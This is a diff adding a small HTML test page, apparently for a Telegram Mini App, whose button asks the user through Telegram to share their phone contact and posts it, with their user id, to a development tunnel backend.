@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+    <header>
+        <title>Test</title>
+    </header>
+
+    <body>
+        <div id="phoneStep" class="input-group">
+            <button id="sharePhoneBtn">Send code</button>
+        </div>
+
+    </body>
+
+    <script>
+        const BACKEND_URL = "https://yotkq-212-90-62-122.run.pinggy-free.link"
+        document.getElementById('sharePhoneBtn').addEventListener('click', () => {
+            
+            tg.requestContact(async (shared, responseData) => {
+                
+                if (shared) {
+                    const contact = responseData.response; 
+                    
+                    const response = await fetch(`${BACKEND_URL}/api/send-phone`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            user_id: tg.initDataUnsafe?.user?.id,
+                            contact_info: contact 
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        document.getElementById('phoneStep').classList.add('hidden');
+                    }
+                }
+                
+                else {
+                    alert('You denied phone share');
+                }
+            });
+        });
+
+    </script>
+</html>
